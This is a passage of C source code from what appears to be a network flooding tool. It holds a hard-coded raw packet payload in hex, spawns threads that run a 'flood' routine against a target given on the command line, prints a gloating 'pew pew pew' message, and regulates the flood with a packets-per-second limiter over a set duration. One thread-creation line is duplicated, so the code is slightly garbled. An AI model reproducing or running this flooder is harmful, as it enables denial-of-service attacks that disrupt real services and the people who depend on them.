			packetstrx = "\x84\x00\xB9\x1E\xE9\x40\x00\x4A\x00\x00\x00\xA1\x00\x00\x00\x00\x00\x58\x3E\xA8\x4A\x81\x78\xD8\x13\x59\xB6\x31\xAE\xCA\x9D\x2B\x23\xA6\x43\x88\x2A\xB6\xDA\x80\xA0\x74\xB3\xBF\x18\xD7\xB6\x5E\xD9\x8F\x4F\x29\x09\xF1\x06\xA6\x0D\x46\xCD\xDD\xC3\xA7\x97\xD0\xDA\xD8\x10\x00\x07\xFD\x2B\x98\x00\x00";
		}

		for (i = 0;i < num_threads;i++) {
			pthread_create(&thread[i], NULL, &flood, (void*)argv[1]);
						pthread_create(&thread[i], NULL, &flood, (void*)argv[1]);
		}
		fprintf(stdout, "pew pew pew i ha HEEEE\n");
		for (i = 0;i < (atoi(argv[8]) * multiplier);i++)
		{
			usleep((1000 / multiplier) * 1000);
			if ((pps * multiplier) > maxpps)
			{
				if (1 > limiter)
				{
					sleeptime += 100;
				}
				else {
					limiter--;
				}
			}
			else {
				limiter++;
				if (sleeptime > 25)
				{
					sleeptime -= 25;
				}
				else {
					sleeptime = 0;
				}
			}
			pps = 0;
		}
		return 0;
	}

